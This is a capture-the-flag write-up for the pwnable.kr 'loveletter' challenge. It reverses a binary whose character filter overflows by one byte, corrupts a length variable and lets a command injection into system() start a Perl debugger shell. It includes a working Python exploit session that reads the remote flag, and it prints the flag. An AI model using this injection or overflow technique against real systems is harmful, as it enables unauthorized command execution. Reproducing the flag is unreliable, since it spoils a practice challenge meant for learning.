
# Loveletter

## Notes

### General info about the binary
- x86 32bit elf
- Stack checking enabled


### What the code does

Basically all that this binary do is reading a name from the user, and prints some qute sentences around the name we've given as input.

**run example**
```
$ ./loveletter 
_ My lover's name is : John
_ Whatever happens, I'll protect her...
_ Impress her upon my memory...
_ Her name echos in my mind...
I love John very much!
```

Even though the code seems extremely simple, behind the scenes there are some flaws in it.

### How the code works

**Running flow**

- Get the name from the stdin
- replace the last character from `\n` to `0x00`
- Pass the name to a `protect` function which we still don't know what it does
- Write something to a variable in the data segment called `loveletter` (TBD)
- run `system(loveletter)`
- quit the program


**Getting the name from stdin**

Lovername is saved on the stuck as a `char[256]` buffer. It is filled by using fgets in the following way:

```C
char[0x100] lover_name;

// --- snip ---

fgets(lover_name, stdin, 0x100);
```

Seems fine.

**replacing the last character from `\n` to `0x00`**

Decompiler struggles to show the C code that stands behing it 
so we'll take a look at the assembly:

```assembly
lea eax, [esp + lover_name_offset]
push eax 
call strlen
sub eax, 1
; Now eax holds the length of the lover name minus 1

movzx eax, byte ptr [esp + lover_name_index + eax]
cmp al, 0xA
jnz .should_now_replace 

lea eax, [esp + lover_name_offset]
push eax 
call strlen
sub eax, 1

mov byte ptr [esp + lover_name_offset], 0

.should_not_replace
```


This also seems fine.


**The `protect` Method**

The protect is called with the name we provided as an argument:

`protect(lover_name)`

Inside this function we can see that it contains a `char[]` variable that contains the following characters:

```C
char[] special_characters = "`;&#*|"'><~?[)(^$}{],\"
```

Then we have a kind of a nested loop that seems to filter out these 
characters in a very odd way. Here is `protect` function rewritten for better readability.

```C
void protect(lover_name) {
    char[256] temp;
    char[] special_characters = "`;&#*|\"'><~?[)(^$}{],\\";
    int lover_name_index = 0;
    int special_characters_index;

    while (true) {
        if (lover_name_index == strlen(lover_name)) 
            break;

        special_characters_index = 0    
        while (true) {
            if (lover_name[lover_name_index] == special_characters[special_character_index]) {
                strcpy(temp, lover_name + lover_name_index + 1);
                *(*unsigned long)(param1 + lover_name_index) = 0xa599e2;

                int temp_length = strlen(temp);
                int lover_name_length = strlen(lover_name);
                
                // The flaw here is that memcpy is used to copy 'temp' value 
                // into 'lover_name' value, with the size of 'temp' that was received by 
                // using strlen. This results the nullbyte of temp to not
                // being copied, therefore a memoryleak may will occur.
                memcpy(lover_name + lover_name_length, temp, temp_length);
            }
        }

    }
}
```


**Write to `loveletter`**

Inside the main function, after the `protect` function is called, there are 3 usages of `memcpy` which insert values into `loveletter`. 

Variables stored on the data segment:
- `loveletter` 
- `idx`             = 0
- `prolog`          = "echo I love "
- `epilog`          = "very much"

This is what it looks like in the code:

```C
int prolog_length = strlen(prologue);
int epilog_length = strlen(epilog);

// ----- snip ------

protect(lover_name)

// ----- snip ------

int name_length = strlen(lover_name);
memcpy(loveletter + idx, prolog, prolog_length);
idx += prolog_length
memcpy(loveletter + idx, name, name_length);
idx += name_length;
memcpy(loveletter + idx, epilog, epilog_length);
```

**Calling `system`**

After assigned `prolog + lover_name + epilog` to `loveletter`, the last sentence
is printed by usign `system`:

`system(loveletter)`

At this stage this is pretty obvious that what we should do is manipulate the loveletter variable to get a shell.

## Solution

The solution was abusing the logic inside the `protect` method. Since it replaces each special character with a unicode character, we will provide the prgoram with 254 'A' and one special character it will overflow the buffer (the buffer is 0x100 sized).

What'll happen is:

`&AAAAAAAAAAAAAAAA...`

would be converted to:

`♥AAAAAAAAAAAAAAAA...`

which is 2 bytes longer. Because of the nullbyte, it will overflow by 1 byte. Of course we can overflow by much more, but actually 1 byte is all we need. 

The one byte we overflow will go straight to the variable `prolog_length` which initialized before the call to `protect`, so our byte will actually take effect.

If we put the value 0x01 in the prolog_length, instead of `echo I love` we will get `e`

Now Imagine what we have:

`e{lover_name} very much`

what I did was inserting the following lover name:

`xec perl -de1 & AAAAAAA ... \x01`

Here is what it looks like in python code:

```python
In [130]: payload = b'xec perl -de1 &'

In [131]: payload += b'A' * (255 - len(payload) - 1) + b'\x01'

In [132]: payload
Out[132]: b'xec perl -de1 &AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x01'
```

Here is the complete solution:

```python
In [133]: payload = b'xec perl -de1 &'

In [134]: payload += b'A' * (255 - len(payload) - 1) + b'\x01'

In [135]: sock = socket.socket()

In [136]: sock.connect(('pwnable.kr', 9034))

In [137]: sock.send(payload)
Out[137]: 255

In [138]: print(sock.recv(1024).decode())

Loading DB routines from perl5db.pl version 1.49
Editor support available.

Enter h or 'h h' for help, or 'man perldebug' for more help.

main::(-e:1):   1
  DB<1> 

In [139]: sock.send(b'system("ls /home/loveletter_pwn");\n')
Out[139]: 35

In [140]: print(sock.recv(1024).decode())
flag
log
loveletter
super.pl

  DB<2> 

In [141]: sock.send(b'system("cat /home/loveletter_pwn/flag");\n')
Out[141]: 41

In [142]: print(sock.recv(1024).decode())
1_Am_3t3rn4l_L0veR

  DB<3> 
```


**Why Perl?**
Well, Perl maybe sucks, but:
- Perl is a built in way to execute code
- in case of `perl -de1`, if we pass more arguments (for example: `very much`), It'll simply ignore it, that's why `python`, `bash`, `sh` commands won't work















